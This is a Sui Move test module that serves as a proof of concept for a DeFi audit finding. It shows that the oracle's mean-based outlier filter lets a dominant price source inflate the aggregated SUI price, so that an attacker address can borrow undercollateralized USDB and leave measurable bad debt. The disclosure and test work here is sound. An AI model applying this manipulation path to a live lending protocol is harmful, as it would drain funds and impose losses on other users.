#[test_only]
/// End-to-end impact PoC: the unsound oracle outlier filter (mean-based) lets a
/// weighted anomalous source push the AGGREGATED price to an inflated value. The
/// CDP consumes that price in its collateral-ratio check, so an attacker borrows
/// far MORE USDB than the true collateral backs -> protocol bad debt / fund loss.
module bucket_v2_cdp::adversarial_oracle_cdp_tests {
    use bucket_v2_cdp::vault::{Self, Vault};
    use bucket_v2_cdp::bucket_v2_cdp_tests::{Self as cdp, LiquidationRule, RequestCheck, ResponseCheck};
    use bucket_v2_usd::admin::AdminCap;
    use bucket_v2_usd::usdb::{Self, USDB, Treasury};
    use bucket_v2_usd::bucket_v2_usd_tests::admin;
    use bucket_v2_framework::{float, account};
    use bucket_v2_oracle::aggregator::{Self, PriceAggregator};
    use bucket_v2_oracle::listing::{Self, ListingCap};
    use bucket_v2_oracle::collector;
    use bucket_v2_oracle::result::{Self, PriceResult};
    use sui::sui::SUI;
    use sui::{coin, clock::Clock, test_scenario::{Self as ts, Scenario}};

    public struct HonestA has drop {}
    public struct HonestB has drop {}
    public struct Rogue has drop {}

    // Realistic "primary + 2 backups" oracle sources for the majority-weight PoC.
    public struct Primary has drop {}
    public struct BackupA has drop {}
    public struct BackupB has drop {}

    // Honest sources say `honest_bps`, a heavily-weighted rogue says `rogue_bps`.
    // The mean-based outlier filter drops the honest sources; the rogue dominates.
    fun rigged_price(s: &mut Scenario, user: address, honest_bps: u64, rogue_bps: u64): PriceResult<SUI> {
        s.next_tx(user);
        let agg = s.take_shared<PriceAggregator<SUI>>();
        let mut c = collector::new<SUI>();
        c.collect(HonestA {}, option::some(float::from_bps(honest_bps)));
        c.collect(HonestB {}, option::some(float::from_bps(honest_bps)));
        c.collect(Rogue {}, option::some(float::from_bps(rogue_bps)));
        let r = agg.aggregate(c);
        ts::return_shared(agg);
        r
    }

    // Realistic topology: Primary (60% weight) deviates to `primary_bps`; two honest
    // backups (20% each) report `backup_bps`. With deviation inside the derived window
    // the mean-filter discards BOTH backups and the aggregate resolves to the primary.
    fun majority_price(s: &mut Scenario, user: address, primary_bps: u64, backup_bps: u64): PriceResult<SUI> {
        s.next_tx(user);
        let agg = s.take_shared<PriceAggregator<SUI>>();
        let mut c = collector::new<SUI>();
        c.collect(Primary {}, option::some(float::from_bps(primary_bps)));
        c.collect(BackupA {}, option::some(float::from_bps(backup_bps)));
        c.collect(BackupB {}, option::some(float::from_bps(backup_bps)));
        let r = agg.aggregate(c);
        ts::return_shared(agg);
        r
    }

    #[test]
    fun test_oracle_manipulation_enables_undercollateralized_borrow() {
        let supply_limit = 100_000_000 * 10u64.pow(usdb::decimal());
        let mut scenario = cdp::setup<SUI, LiquidationRule>(9, supply_limit);
        let s = &mut scenario;

        // disable request/response checklists so we can drive the vault directly
        s.next_tx(admin());
        {
            let mut vault = s.take_shared<Vault<SUI>>();
            let cap = s.take_from_sender<AdminCap>();
            vault.remove_request_check<SUI, RequestCheck>(&cap);
            vault.remove_response_check<SUI, ResponseCheck>(&cap);
            ts::return_shared(vault);
            s.return_to_sender(cap);
        };

        // oracle: 2 honest (w1) + 1 rogue (w10), tolerance 10%
        s.next_tx(admin());
        listing::init_for_testing(s.ctx());
        s.next_tx(admin());
        {
            let mut cap = s.take_from_sender<ListingCap>();
            aggregator::create<SUI>(&mut cap, 2, 1000, s.ctx());
            s.return_to_sender(cap);
        };
        s.next_tx(admin());
        {
            let cap = s.take_from_sender<ListingCap>();
            let mut agg = s.take_shared<PriceAggregator<SUI>>();
            agg.set_rule_weight<SUI, HonestA>(&cap, 1);
            agg.set_rule_weight<SUI, HonestB>(&cap, 1);
            agg.set_rule_weight<SUI, Rogue>(&cap, 10);
            s.return_to_sender(cap);
            ts::return_shared(agg);
        };

        let attacker = @0xBAD;
        let deposit = cdp::sui(1_000);   // 1000 SUI, truly ~1000 USD at price 1.0
        let borrow = cdp::usdb(1_800);   // impossible at true 1.0, allowed at rigged 2.0

        // rigged aggregate price ~2.0 (honest 1.0 dropped by the broken filter)
        let price = rigged_price(s, attacker, 10000, 20000);
        assert!(price.aggregated_price().gte(float::from_bps(19000)), 9200);

        // attacker borrows 1800 USDB against 1000 SUI using the rigged price
        s.next_tx(attacker);
        let clock = s.take_shared<Clock>();
        let mut vault = s.take_shared<Vault<SUI>>();
        let mut treasury = s.take_shared<Treasury>();
        let acc = account::request(s.ctx());
        let dep = coin::mint_for_testing<SUI>(deposit, s.ctx());
        let req = vault.debtor_request(&acc, &treasury, dep, borrow, coin::zero(s.ctx()), 0);
        let (coll_out, usdb_out, res) = vault.update_position(
            &mut treasury, &clock, &option::some(price), req, s.ctx());
        vault.destroy_response(&treasury, res);

        assert!(usdb_out.value() == borrow, 9201);        // walked away with 1800 USDB
        coll_out.destroy_zero();
        usdb_out.burn_for_testing();

        // at the TRUE price 1.0 the position is deeply unhealthy: 1000 coll vs 1800 debt
        let true_price = result::new_for_testing<SUI>(float::from_bps(10000));
        assert!(!vault.position_is_healthy(attacker, &clock, &true_price), 9202);

        // Quantify the loss explicitly (kills the "free assets / mint_for_testing" objection):
        // the 1800 USDB the attacker minted are a REAL protocol liability. Measure how much of
        // that liability is NOT backed by collateral at the true price.
        //   coll_amount is 9-dec SUI; debt_amount is 6-dec USDB. At true price $1, converting the
        //   collateral to USDB units divides by 10^(9-6) = 1000 -> 1e12/1000 = 1e9 = 1000 USDB.
        let (coll_amount, debt_amount) = vault.get_position_data(attacker, &clock);
        let coll_value_usdb = coll_amount / 1000;               // true USDB value of collateral
        assert!(debt_amount > coll_value_usdb, 9203);           // debt exceeds true collateral value
        let bad_debt = debt_amount - coll_value_usdb;           // unbacked USDB (protocol loss)
        assert!(bad_debt >= cdp::usdb(700), 9204);              // >= 700 USDB of pure bad debt (~800)
        // Even a full liquidation at the true price recovers only the ~1000 USDB of collateral,
        // leaving `bad_debt` USDB minted with nothing behind it -> direct loss of funds.

        ts::return_shared(clock);
        ts::return_shared(vault);
        ts::return_shared(treasury);
        scenario.end();
    }

    /// HIGH-severity end-to-end PoC under a REALISTIC production topology.
    ///
    /// Oracle config: Primary 60% + BackupA 20% + BackupB 20% (a single source with a
    /// strict majority — the canonical "primary feed + backups" design, accepted by the
    /// contract with no cap; see test_configuration_accepts_majority_weight_source).
    ///
    /// The primary deviates +25% (inside the derived window for f=60%, tol=10%:
    /// 18.52% < 25% <= 29.41%), so the mean-filter discards BOTH honest backups and the
    /// aggregate resolves to 1.25 — NOT attacker-forged, just a deviating majority feed.
    ///
    /// Financial impact with the vault's real rules (MCR = 110%, SUI 9dp, USDB 6dp):
    ///   collateral      = 1,000 SUI
    ///   true value      = 1,000 USDB  -> true max debt = 1000 / 1.10 = 909 USDB
    ///   protocol value  = 1,250 USDB  -> wrong max debt = 1250 / 1.10 = 1,136 USDB
    ///   borrow taken    = 1,100 USDB  (impossible at true price, allowed at 1.25)
    /// After the price corrects to 1.00 the position holds 1,000 USDB of collateral behind
    /// 1,100 USDB of debt => >= 100 USDB of unrecoverable protocol bad debt per 1,000 SUI.
    #[test]
    fun test_realistic_majority_source_enables_bad_debt() {
        let supply_limit = 100_000_000 * 10u64.pow(usdb::decimal());
        let mut scenario = cdp::setup<SUI, LiquidationRule>(9, supply_limit);
        let s = &mut scenario;

        s.next_tx(admin());
        {
            let mut vault = s.take_shared<Vault<SUI>>();
            let cap = s.take_from_sender<AdminCap>();
            vault.remove_request_check<SUI, RequestCheck>(&cap);
            vault.remove_response_check<SUI, ResponseCheck>(&cap);
            ts::return_shared(vault);
            s.return_to_sender(cap);
        };

        // Realistic oracle: Primary 60%, two backups 20% each, tolerance 10%.
        s.next_tx(admin());
        listing::init_for_testing(s.ctx());
        s.next_tx(admin());
        {
            let mut cap = s.take_from_sender<ListingCap>();
            aggregator::create<SUI>(&mut cap, 2, 1000, s.ctx());
            s.return_to_sender(cap);
        };
        s.next_tx(admin());
        {
            let cap = s.take_from_sender<ListingCap>();
            let mut agg = s.take_shared<PriceAggregator<SUI>>();
            agg.set_rule_weight<SUI, Primary>(&cap, 60);
            agg.set_rule_weight<SUI, BackupA>(&cap, 20);
            agg.set_rule_weight<SUI, BackupB>(&cap, 20);
            s.return_to_sender(cap);
            ts::return_shared(agg);
        };

        let attacker = @0xBAD;
        let deposit = cdp::sui(1_000);
        let borrow = cdp::usdb(1_100);   // > true max (909), < wrong max (1136)

        // Aggregate resolves to the deviated primary price 1.25 (backups discarded).
        let price = majority_price(s, attacker, 12500, 10000);
        assert!(price.aggregated_price().eq(float::from_bps(12500)), 9300);

        s.next_tx(attacker);
        let clock = s.take_shared<Clock>();
        let mut vault = s.take_shared<Vault<SUI>>();
        let mut treasury = s.take_shared<Treasury>();
        let acc = account::request(s.ctx());
        let dep = coin::mint_for_testing<SUI>(deposit, s.ctx());
        let req = vault.debtor_request(&acc, &treasury, dep, borrow, coin::zero(s.ctx()), 0);
        // Passes the CDP health check ONLY because position_is_healthy consumes the wrong price.
        let (coll_out, usdb_out, res) = vault.update_position(
            &mut treasury, &clock, &option::some(price), req, s.ctx());
        vault.destroy_response(&treasury, res);

        assert!(usdb_out.value() == borrow, 9301);
        coll_out.destroy_zero();
        usdb_out.burn_for_testing();

        // Price corrects to the honest 1.00: the position is now undercollateralized.
        let true_price = result::new_for_testing<SUI>(float::from_bps(10000));
        assert!(!vault.position_is_healthy(attacker, &clock, &true_price), 9302);

        // Quantify the unrecoverable bad debt at the true price.
        let (coll_amount, debt_amount) = vault.get_position_data(attacker, &clock);
        let coll_value_usdb = coll_amount / 1000;           // 1000 SUI -> 1000 USDB at $1
        assert!(debt_amount > coll_value_usdb, 9303);       // debt exceeds true collateral
        let bad_debt = debt_amount - coll_value_usdb;
        assert!(bad_debt >= cdp::usdb(90), 9304);           // >= ~100 USDB unbacked / 1000 SUI

        ts::return_shared(clock);
        ts::return_shared(vault);
        ts::return_shared(treasury);
        scenario.end();
    }
}
